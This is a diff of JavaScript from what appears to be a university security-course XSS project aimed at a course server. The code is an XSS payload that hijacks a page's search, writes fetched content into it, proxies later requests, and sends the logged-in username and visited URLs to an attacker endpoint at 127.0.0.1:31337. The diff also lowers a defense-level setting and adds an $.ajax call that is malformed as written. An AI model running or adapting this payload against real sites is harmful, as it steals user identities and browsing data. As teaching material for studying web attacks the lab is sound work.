@@ -73,8 +73,9 @@ function payload(attacker) {
 			  $.get(ad+"search?q=" + q, 
 			  function(e){document.write(e);});
 			  e.preventDefault();
+			  $.ajax({ad+"search?q="+q,success:function(e){
+				document.write(e); proxy(ad+"search?q="+q,ru,1);}});
 			  $.get(attacker+"stolen?event=nav&user="+$('#logged-in-user').text()+"&url="+ad+"search?q="+q);
-  		      proxy(ad+"search?q=" + q, ru, 1);
 	        }); 
 	        $("#search-again-btn").click(function(e){
 		      e.preventDefault();
@@ -131,7 +132,7 @@ function makeLink(xssdefense, target, attacker) {
 		}
 	}
 
-	var xssdefense = 3;
+	var xssdefense = 2;
 	var target = "http://cis551.cis.upenn.edu/project3/";
 	var attacker = "http://127.0.0.1:31337/";
 
